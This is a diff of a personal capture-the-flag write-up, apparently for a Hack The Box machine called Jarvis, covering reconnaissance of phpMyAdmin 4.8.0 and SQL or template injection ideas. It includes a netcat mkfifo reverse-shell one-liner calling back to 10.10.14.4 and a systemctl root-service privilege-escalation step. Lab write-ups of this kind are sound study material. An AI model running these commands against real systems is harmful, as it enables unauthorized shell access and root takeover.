@@ -125,9 +125,9 @@
 * There's also this tamplating engine "Twig" that is a templating engine for the programming language php. I can inject code into it if it's vulnerable, but I'm not sure yet about this approach.
 * SQL injection. Not sure where to go from here.
 * There's this weird line of code in the response that has like weird stuff that I don't know if they're helpful 
-```javascript
-PMA_commonParams.setAll({common_query:"",opendb_url:"db_structure.php",lang:"en_GB",server:"1",table:"",db:"",token:")^||1xKqg]1MzIfK",text_dir:"ltr",show_databases_navigation_as_tree:true,pma_text_default_tab:"Browse",pma_text_left_default_tab:"Structure",pma_text_left_default_tab2:false,LimitChars:"50",pftext:"",confirm:true,LoginCookieValidity:"1440",session_gc_maxlifetime:"1440",logged_in:false,is_https:false,rootPath:"/phpmyadmin/",arg_separator:"&",PMA_VERSION:"4.8.0",auth_type:"cookie",user:"root"}
-```  
+  ```javascript
+  PMA_commonParams.setAll({common_query:"",opendb_url:"db_structure.php",lang:"en_GB",server:"1",table:"",db:"",token:")^||1xKqg]1MzIfK",text_dir:"ltr",show_databases_navigation_as_tree:true,pma_text_default_tab:"Browse",pma_text_left_default_tab:"Structure",pma_text_left_default_tab2:false,LimitChars:"50",pftext:"",confirm:true,LoginCookieValidity:"1440",session_gc_maxlifetime:"1440",logged_in:false,is_https:false,rootPath:"/phpmyadmin/",arg_separator:"&",PMA_VERSION:"4.8.0",auth_type:"cookie",user:"root"}
+  ```  
 
 * It might be a Server Side Template Injection.
 * Also, look into the exploits that phpmyadmin version 4.8.0 have. Seems like it has alot of exploits.
@@ -155,7 +155,7 @@ www-data can run this command as pepper (THAT'S SOMETHING)
 
 
 
-## How Did I Solve the Challenge   
+## How Did I Solve the Machine 
 
    <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   
 
@@ -175,7 +175,6 @@ www-data can run this command as pepper (THAT'S SOMETHING)
 12. Anyway, as soon as I got pepper I used `/bin/systemctl` to create a root service and then run it like this       
 13. Create a file that contains this and has a name like so "root.service"
 	```console
-
 	[Unit]
 	Description=roooooooooot
 
@@ -229,23 +228,13 @@ www-data can run this command as pepper (THAT'S SOMETHING)
 
 
 
-* I will write the facts I have until now:
-
-	1. Seems like phpmyadmin is a deadend.
-	2. There's something that has to do with "browsing the rooms".
-	3. I browsed the rooms and I don't think it should give me a page when I put a code that does not exist but it does give me a page with the images directory only instead of an image and with the name and price of the room as empty.
-	4. The page itself is `room.php` so it's a php page and it's taking a parameter `cod=` to check which room we have so that it will send the proper data.  
-	5. I couldn't find any place to upload a php file so that I can execute it through the `/images` directory and get a reverse shell that way.   
-	6. Make sure to remember that the exploiting the front end at the moment won't do me any good, I need a way to exploit the backend so that I can access the server and execute a reverse shell there and frontend is never going to give me that.   
-	7. Tried to look for something in the source code that could give me something but found nothing yet. But still I have to keep remembering that javascript, jquery or css won't do me any good in this case.  
-	8. I'm thinking maybe I can abuse the url in some way, LFI or RFI or something like that. I'm not really sure about this. When researching, I noticed that all the websites state that LFI or RFI occur when the input in the url isn't sanitized correctly but how the hell am I supposed to know when the input isn't sanitized the proper way? Do I, like, try?    
-	    They're saying it's usually because of the lack of input validation that site becomes vulnerable to LFI.
-
-
 
 
 
 
 * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 >/tmp/f
 
-* I've used a php script that takes commands as input so when I put the "mkfifo" command above it gave me a rev shell on my own because it executed the command the wrong way so when I put "" double quotations it solved the problem and took the whole line of commands as input.
+* I've used a php script that takes commands as input so when I put the "mkfifo" command above it gave me a rev shell on my own because it executed the command the wrong way so when I put "" double quotations it solved the problem and took the whole line of commands as input.  
+
+
+<!--@nested-tags:Sql Injection/Jarvis,SUID/Jarvis-->
